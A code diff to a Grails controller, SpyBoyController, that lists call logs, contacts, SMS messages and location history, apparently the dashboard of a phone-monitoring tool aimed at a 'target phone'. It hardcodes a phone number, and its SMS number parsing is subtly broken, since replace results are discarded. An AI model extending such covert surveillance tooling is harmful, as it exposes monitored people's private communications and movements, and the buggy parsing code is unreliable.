@@ -1,6 +1,6 @@
-
-
 package com.xaviar
+
+import grails.converters.JSON;
 
 import com.xaviar.domain.CallLog
 import com.xaviar.domain.Contact
@@ -30,7 +30,7 @@ class SpyBoyController {
 		//def callLogs = CallLog.findByTargetPhone(subscriberId);//callLogService.readAll(uMetaData);
 		params.max = Math.min(params.max ? params.int('max') : 10, 100)
 		params.phoneNumber = "0543112117";
-		
+
 		[callLogInstanceList:CallLog.list(params), callLogsInstanceTotal: CallLog.count()]
 
 		//		if(!callLogs.isEmpty()){
@@ -52,7 +52,7 @@ class SpyBoyController {
 
 	def contacts(){
 		params.max = Math.min(params.max ? params.int('max') : 50, 100)
-		[contactInstanceList: Contact.list(), contactInstanceTotal: Contact.count()]
+		render(template:"contacts",model:[contactInstanceList: Contact.list(sort:"name"), contactInstanceTotal: Contact.count()]);
 		//Set<String> subscribers = userService.getUserInfo("token123");
 		//		UMetaData  uMetaData = new UMetaData(subscriberId,"token123");
 		//
@@ -74,7 +74,27 @@ class SpyBoyController {
 
 	def sms(){
 		params.max = Math.min(params.max ? params.int('max') : 50, 100)
-		[smsInstanceList: Sms.list(), smsInstanceTotal: Sms.count()]
+		//default sms of first contact
+		//List<Contact> firstContacts  = Contact.list(max:"1");
+		String number = params.number;//firstContacts.get(0).number;
+		def smss=null;
+		if(number!=null){
+			if(number.length()>8){
+				if(!number.find("[#*+-]")){
+					number = Long.parseLong(number).toString();
+				}else if (number.find("[+]")){
+					number.replace("+972","");
+					number = Long.parseLong(number).toString();
+				}else if(number.find("[-]")){
+					number.replace('-',' ');
+					number = Long.parseLong(number).toString();
+				}
+			}
+
+			println (number);
+			smss = Sms.findAllByAddressLike("%" + number,[sort:"time",order:"desc"]);
+		}
+		render(template:"sms",model:[smsInstanceList: smss, smsInstanceTotal: Sms.count()]);
 		//Set<String> subscribers = userService.getUserInfo("token123");
 		//		UMetaData  uMetaData = new UMetaData(subscriberId,"token123");
 		//
@@ -98,19 +118,7 @@ class SpyBoyController {
 	}
 
 	def location(){
-		//params.max = Math.min(params.max ? params.int('max') : 50, 100)
-
-		List locations = Location.list();
-		String locationStr = "";
-		String startLocationStr="";
-		int i=1;
-
-		for (location in locations) {
-			locationStr=locationStr+"{latitude: "+location.latitude+",longitude: " + location.longitude + " ,html: 'place no. " + (i++) + "'},";
-		}
-
-		startLocationStr="latitude: "+locations.get(0).latitude+",longitude: " + locations.get(0).longitude + ",zoom: 10";
-		
-		[locationInstanceList: Location.list(), locationInstanceTotal: Location.count(),locationStr:locationStr,startLocationStr:startLocationStr]
+		List locations = Location.list(sort:"time");
+		[locationInstanceList:locations as JSON,locationInstanceTotal: Location.count()];
 	}
 }
